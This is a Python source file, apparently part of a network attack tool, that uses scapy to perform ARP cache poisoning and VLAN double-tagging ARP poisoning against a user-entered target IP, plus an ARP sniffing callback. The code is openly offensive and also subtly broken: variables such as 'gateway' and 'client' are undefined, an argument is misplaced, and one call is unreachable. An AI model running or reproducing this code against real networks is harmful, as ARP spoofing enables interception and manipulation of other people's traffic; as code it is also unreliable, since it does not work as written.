
#----------------------------------------------------------------------------------------------------------------------------------------------------------
#Imports
from scapy.all import *
import ipaddress, socket, time
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time
import pyfiglet
from termcolor import colored
import netifaces
import ipaddress
from identifiers.mac import *

#----------------------------------------------------------------------------------------------------------------------------------------------------------

#variables in the rich library
console = Console()

#----------------------------------------------------------------------------------------------------------------------------------------------------------

    # scapy poison packet interferes with ARP table cache 
def arp_cache_poison(target_ip, router_ip, router_mac, target_mac, source_mac):
    target_ip = console.input("[yellow]| Enter Target IP:")
    target_mac = get_mac(target_ip)
    if not target_mac:
        console.print(f"[red] Could not resolve MAC for {target_ip}")
        return 

    source_mac = get_my_mac()
    if not source_mac:
        console.print(f"[red] Could not resolve MAC for host")
        return

    sendp(Ether(dst=target_mac)/ARP(op="who-has", psrc=gateway, pdst=client),
        inter=RandNum(10,40), loop=1)




def arp_vlan_poison():
    target_ip = console.input("[yellow]| Enter Target IP:")
    target_mac = get_mac(target_ip)

    sendp(Ether(dst=target_mac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
        /ARP(op="who-has", psrc=gateway, pdst=client,
        inter=RandNum(10,40)))


def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2):
        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")

    sniff(prn=arp_monitor_callback, filter="arp", store=0)

#----------------------------------------------------------------------------------------------------------------------------------------------------------

